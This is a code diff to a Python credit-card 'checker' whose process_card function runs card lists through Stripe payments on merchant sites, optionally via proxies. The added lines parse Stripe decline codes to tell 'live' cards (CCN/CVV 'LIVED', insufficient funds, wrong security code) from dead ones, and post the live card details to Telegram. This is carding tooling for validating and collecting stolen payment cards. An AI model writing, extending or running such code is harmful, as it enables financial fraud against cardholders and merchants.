@@ -598,9 +598,70 @@ def process_card(lista: str, sites: str, proxy: str = None) -> str:
         )
         stripe_result = stripe_response.text
         
+        # Check for Stripe API errors first
+        if '"error"' in stripe_result:
+            bin_info = get_bin_info(cc6, session, ua)
+            elapsed_time = time.time() - time_start
+            
+            # Extract error message from Stripe response
+            error_message = get_str(stripe_result, '"message": "', '"')
+            if not error_message:
+                error_message = get_str(stripe_result, '"message":"', '"')
+            
+            error_code = get_str(stripe_result, '"code": "', '"')
+            if not error_code:
+                error_code = get_str(stripe_result, '"code":"', '"')
+            
+            decline_code = get_str(stripe_result, '"decline_code": "', '"')
+            if not decline_code:
+                decline_code = get_str(stripe_result, '"decline_code":"', '"')
+            
+            # Handle specific Stripe error codes
+            if error_code == "incorrect_cvc" or "security code" in error_message.lower():
+                telegram_msg = f"[#CCN] - {lista} [STRIPE CCN LIVED]\n[Security code incorrect]\n[{price1}]\n[{hostname}]"
+                send_to_telegram(telegram_msg)
+                return format_response("CCN", "✅", lista, price1, "Security Code Incorrect", bin_info, elapsed_time)
+            elif error_code == "card_declined":
+                if decline_code == "insufficient_funds":
+                    telegram_msg = f"[#CVV] - {lista} [STRIPE CVV LIVED]\n[Insufficient funds]\n[{price1}]\n[{hostname}]"
+                    send_to_telegram(telegram_msg)
+                    return format_response("CVV", "✅", lista, price1, "Insufficient Funds", bin_info, elapsed_time)
+                elif decline_code == "lost_card":
+                    return format_response("DECLINED", "❌", lista, price1, "Lost Card", bin_info, elapsed_time)
+                elif decline_code == "stolen_card":
+                    return format_response("DECLINED", "❌", lista, price1, "Stolen Card", bin_info, elapsed_time)
+                elif decline_code == "generic_decline":
+                    return format_response("DECLINED", "❌", lista, price1, "Card Declined", bin_info, elapsed_time)
+                elif decline_code == "do_not_honor":
+                    return format_response("DECLINED", "❌", lista, price1, "Do Not Honor", bin_info, elapsed_time)
+                elif decline_code == "fraudulent":
+                    return format_response("DECLINED", "❌", lista, price1, "Fraudulent Card", bin_info, elapsed_time)
+                elif decline_code:
+                    return format_response("DECLINED", "❌", lista, price1, f"Declined: {decline_code}", bin_info, elapsed_time)
+                else:
+                    return format_response("DECLINED", "❌", lista, price1, "Card Declined", bin_info, elapsed_time)
+            elif error_code == "expired_card":
+                return format_response("DECLINED", "❌", lista, price1, "Expired Card", bin_info, elapsed_time)
+            elif error_code == "invalid_card_number" or error_code == "incorrect_number":
+                return format_response("DECLINED", "❌", lista, price1, "Invalid Card Number", bin_info, elapsed_time)
+            elif error_code == "invalid_expiry_month" or error_code == "invalid_expiry_year":
+                return format_response("DECLINED", "❌", lista, price1, "Invalid Expiry Date", bin_info, elapsed_time)
+            elif error_code == "processing_error":
+                return format_response("DECLINED", "❌", lista, price1, "Processing Error", bin_info, elapsed_time)
+            elif error_message:
+                return format_response("DECLINED", "❌", lista, price1, error_message[:50], bin_info, elapsed_time)
+            else:
+                return format_response("DECLINED", "❌", lista, price1, "Stripe API Error", bin_info, elapsed_time)
+        
         payment_id = get_str(stripe_result, '"id": "', '"')
         if not payment_id:
             payment_id = get_str(stripe_result, '"id":"', '"')
+        
+        # If still no payment_id, the card might be invalid
+        if not payment_id:
+            bin_info = get_bin_info(cc6, session, ua)
+            elapsed_time = time.time() - time_start
+            return format_response("DECLINED", "❌", lista, price1, "Failed to create payment method", bin_info, elapsed_time)
         
         # Detect payment method
         payment_methods = [
@@ -719,8 +780,43 @@ def process_card(lista: str, sites: str, proxy: str = None) -> str:
         elif "card was declined" in payment_result.lower():
             return format_response("DECLINED", "❌", lista, price1, "Card Was Declined", bin_info, elapsed_time)
         
+        elif "do not honor" in payment_result.lower():
+            return format_response("DECLINED", "❌", lista, price1, "Do Not Honor", bin_info, elapsed_time)
+        
+        elif "lost card" in payment_result.lower():
+            return format_response("DECLINED", "❌", lista, price1, "Lost Card", bin_info, elapsed_time)
+        
+        elif "stolen card" in payment_result.lower():
+            return format_response("DECLINED", "❌", lista, price1, "Stolen Card", bin_info, elapsed_time)
+        
+        elif "expired card" in payment_result.lower():
+            return format_response("DECLINED", "❌", lista, price1, "Expired Card", bin_info, elapsed_time)
+        
+        elif "invalid card" in payment_result.lower() or "incorrect number" in payment_result.lower():
+            return format_response("DECLINED", "❌", lista, price1, "Invalid Card Number", bin_info, elapsed_time)
+        
+        elif "fraudulent" in payment_result.lower():
+            return format_response("DECLINED", "❌", lista, price1, "Fraudulent Card", bin_info, elapsed_time)
+        
+        elif "pickup card" in payment_result.lower():
+            return format_response("DECLINED", "❌", lista, price1, "Pickup Card", bin_info, elapsed_time)
+        
+        elif "restricted card" in payment_result.lower():
+            return format_response("DECLINED", "❌", lista, price1, "Restricted Card", bin_info, elapsed_time)
+        
+        elif "transaction not allowed" in payment_result.lower():
+            return format_response("DECLINED", "❌", lista, price1, "Transaction Not Allowed", bin_info, elapsed_time)
+        
+        elif "try again" in payment_result.lower():
+            return format_response("DECLINED", "❌", lista, price1, "Try Again Later", bin_info, elapsed_time)
+        
         else:
-            return format_response("DECLINED", "❌", lista, price1, messages if messages else "Unknown Error", bin_info, elapsed_time)
+            # Try to extract a meaningful error message
+            error_msg = messages if messages else "Unknown Error"
+            # Clean up the error message
+            if error_msg and len(error_msg) > 100:
+                error_msg = error_msg[:100] + "..."
+            return format_response("DECLINED", "❌", lista, price1, error_msg, bin_info, elapsed_time)
     
     except requests.exceptions.RequestException as e:
         bin_info = get_bin_info(cc6, session, ua)
